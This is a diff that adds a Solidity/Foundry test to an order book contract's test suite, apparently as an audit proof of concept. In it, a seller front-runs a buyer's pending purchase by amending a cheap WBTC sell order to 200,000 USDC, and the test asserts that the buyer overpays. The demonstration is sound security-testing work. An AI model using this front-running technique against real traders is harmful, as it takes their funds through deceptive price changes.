@@ -215,4 +215,46 @@ contract TestOrderBook is Test {
 
         assert(usdc.balanceOf(owner) == 5_559e6);
     }
+
+    function testBasicPriceManipulationAttack() public {
+        console2.log("=== Basic Price Manipulation Attack ===");
+        
+        // 1. Malicious seller creates attractive order
+        vm.startPrank(alice);
+        wbtc.approve(address(book), 2e8);
+        uint256 aliceId = book.createSellOrder(address(wbtc), 2e8, 1e6, 2 days); // extremely cheap offer
+        vm.stopPrank();
+        
+        // 2. Simulate mempool detection - seller sees buyer's transaction
+        // In reality, this would be done by monitoring mempool
+        console2.log("\n[ATTACK] Seller detects incoming buy transaction in mempool");
+        
+        // 3. Seller front-runs with price amendment
+        vm.prank(alice);
+        book.amendSellOrder(aliceId, 2e8, 200_000e6, 2 days);
+        string memory aliceOrderDetails = book.getOrderDetailsString(aliceId);
+        console2.log(aliceOrderDetails);
+        
+        // 4. Buyer's transaction executes at manipulated price
+        uint256 buyerUSDCBefore = usdc.balanceOf(dan);
+        uint256 buyerWBTCBefore = wbtc.balanceOf(dan);
+        
+        vm.startPrank(dan);
+        usdc.approve(address(book), 200_000e6);
+        book.buyOrder(aliceId);
+        vm.stopPrank();
+        
+        uint256 buyerUSDCAfter = usdc.balanceOf(dan);
+        uint256 buyerWBTCAfter = wbtc.balanceOf(dan);
+        
+        console2.log("\nBuyer transaction completed:");
+        console2.log("- USDC spent:", buyerUSDCBefore - buyerUSDCAfter);
+        console2.log("- WBTC received:", buyerWBTCAfter - buyerWBTCBefore);
+        console2.log("- Expected to pay: 1000000");
+        console2.log("- Actually paid:", buyerUSDCBefore - buyerUSDCAfter);
+        console2.log("- Overpaid by:", (buyerUSDCBefore - buyerUSDCAfter) - 1e6);
+        
+        assertEq(buyerUSDCBefore - buyerUSDCAfter, 200_000e6);
+        assertEq(buyerWBTCAfter - buyerWBTCBefore, 2e8);
+    }
 }
